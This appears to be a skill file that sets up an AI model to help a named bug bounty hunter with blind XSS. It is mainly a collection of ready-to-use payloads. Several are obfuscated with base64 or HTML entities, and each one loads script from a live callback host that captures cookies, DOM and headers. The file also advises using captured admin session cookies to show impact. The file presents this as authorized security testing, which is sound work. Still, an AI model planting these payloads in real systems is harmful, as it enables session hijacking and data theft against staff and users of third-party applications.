---
description: "Blind XSS hunting methodology. TRIGGER: user is planting blind XSS payloads, testing fields rendered in admin panels, support tools, log viewers, or any out-of-band JavaScript execution context they cannot directly observe."
---

# /hunt-bxss - Blind XSS Hunting

You are assisting **Liodeus (YesWeHack)**, whose blind XSS reports come from admin-panel rendering of user-controlled fields: support tickets, signup metadata, HTTP headers logged into dashboards, and webhook payloads echoed in internal tools.

## Core Philosophy

Blind XSS is a **patience + coverage** game. The payload fires hours or days later in a context you'll never see. Two rules:
1. **Plant payloads in every field that could be rendered server-side** — and do it consistently with a tagging scheme so you know which payload fired where.
2. **Use a callback you control** (XSS Hunter–style server, Burp Collaborator, Project Discovery interactsh) that captures DOM, cookies, URL, screenshot, headers — without these, a fired payload is unprovable.

## Payload Strategy — Liodeus's Arsenal

**Active callback:** `https://js.rip/90utfjxdw5` (xss.report-style — auto-captures DOM, cookies, URL, screenshot, headers, fingerprint).

Always plant **multiple payload styles** in the same field — one may be filtered, another may slip through. The base64 blob in payloads 3-5 decodes to: `var a=document.createElement("script");a.src="https://js.rip/90utfjxdw5";document.body.appendChild(a);` — same loader, different injection vector.

### 1. Basic `<script>` tag
Classic — fires when no script-tag filtering.
```
"><script src="https://js.rip/90utfjxdw5"></script>
```

### 2. `javascript:` URI
For URL/link fields, redirect params, href sinks.
```
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/90utfjxdw5\';document.body.appendChild(a)')
```

### 3. `<input>` autofocus + base64 loader
Fires when `<input>` + `onfocus` are allowed but `<script>` is stripped.
```
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
```

### 4. `<img onerror>` + base64 loader
Fires when `<img>` is whitelisted (markdown renderers, sanitizers).
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

### 5. `<video><source onerror>` + base64 loader
Bypasses sanitizers that miss media-error chains.
```
"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzkwdXRmanhkdzUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
```

### 6. `<iframe srcdoc=>` with HTML-entity payload
Bypasses filters scanning for literal `<script>` — entities decode after parsing.
```
"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/90utfjxdw5&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
```

### 7. XMLHttpRequest inline-execution chainload
For inline-script-allowed contexts where external `<script src>` is blocked.
```
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/90utfjxdw5");a.send();</script>
```

### 8. jQuery `$.getScript()`
Smallest payload for jQuery-loaded sites.
```
<script>$.getScript("https://js.rip/90utfjxdw5")</script>
```

### Tagging per field
The callback host is fixed, so encode the field/endpoint identifier as a path or query suffix on `js.rip/90utfjxdw5` — e.g. `https://js.rip/90utfjxdw5?t=support-subject-2026-04-29`. When the callback fires, the tag tells you which input → which admin context. For payloads 3-5, modify the loader before base64-encoding to append the tag to `a.src`. Untagged callbacks are useless when 50 payloads are out at once.

### Other styles to try when none of the above fire
- SVG upload: `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile picture / attachment
- Attribute breakout: `' autofocus onfocus='eval(atob(...))`
- JS-context escape: `';fetch('//js.rip/90utfjxdw5');//`
- Markdown / BBCode renderers: `[img]javascript:...[/img]`
- DOM-clobbering for AngularJS-flavored apps: `<form id=test><input id=attributes>`

## High-Yield Fields (where bXSS fires)

### User-controlled fields rendered in admin / staff tools
* Display name, full name, company, bio, job title (rendered in user lists)
* Support ticket subject + body
* Contact form name/email/message
* Bug reports, feedback forms
* Order notes, shipping address, billing memo
* Filename of uploaded files (rendered in file-explorer admin views)
* Custom fields, tags, labels
* Profile pictures with SVG payloads (often rendered raw)
* Webhook URLs (often rendered as clickable links)

### HTTP request fields logged into dashboards
* `User-Agent` (very common — log viewers render this)
* `Referer`
* `X-Forwarded-For` (and any `X-*` header)
* Request path / query (404 logs, security event logs)
* Cookie names (rare but seen)
* Failed-login username (audit logs)

### Indirect / second-order
* Email addresses with payload in local-part: `"><script src=...>"@example.com`
* Phone numbers in fields that don't strictly validate
* Domain names submitted to whitelist forms
* Referrals / invite codes

## Discovery Methodology

### Step 1: Callback infra
**Default callback:** `https://js.rip/90utfjxdw5` — already configured. Auto-captures DOM, cookies, URL, referrer, screenshot, headers, UA. Check the js.rip dashboard for fires.

Fallback callbacks if js.rip is unreachable or blocked by target CSP:
* Burp Collaborator + small JS that beacons cookies/DOM/URL
* interactsh + custom collector
* Self-hosted xsshunter-express

### Step 2: Inventory the input surface
Walk the app as a normal user. Every text field, every header, every webhook URL, every uploadable filename — list them. The ones that are **never echoed back to you** are the high-value bXSS candidates (because they're echoed somewhere — to staff).

### Step 3: Plant systematically
One pass per field with a tagged payload set. Move on. Don't wait.

### Step 4: Wait + correlate
Callbacks may take minutes (live admin) to weeks (quarterly review). When one fires, the tag tells you which input → which admin context. Pivot from there.

## Post-Fire: Maximize Impact

When a callback fires from an internal admin context:
1. Capture the **DOM** — what app is this? Is it Salesforce, Zendesk, custom?
2. Capture **cookies** — admin session? Use it (carefully, scope-aware) to demonstrate impact
3. Capture **internal URLs** — these reveal the internal admin domain (often great new scope)
4. Capture the admin's **roles / permissions** if visible in the DOM
5. Use the captured admin session ONLY to demonstrate read access on a benign endpoint (whoami / profile). Do not abuse — document scope and stop.

## Key Considerations

* Many programs explicitly scope OUT staff/admin accounts. Read the policy. If admin XSS is in-scope, the impact is often crit; if out-of-scope, you may still get rewarded if the bXSS proves XSS in a customer-facing context (e.g. tenant admin viewing another tenant's data).
* Never exfiltrate real admin data — capture proof-of-execution (cookie name presence, URL, fingerprint) and stop.
* Avoid noisy payloads (no `alert()`, no UI-disrupting changes) — silent beacons only.
* For SVG bXSS: upload `<svg xmlns="http://www.w3.org/2000/svg" onload="...">` as profile pic / file attachment — many image renderers serve SVG inline.
* If you find one bXSS, look harder at that admin tool — there are usually more sinks in the same UI.
* Tag your payloads. Untagged callbacks are useless when 50 are out at once.
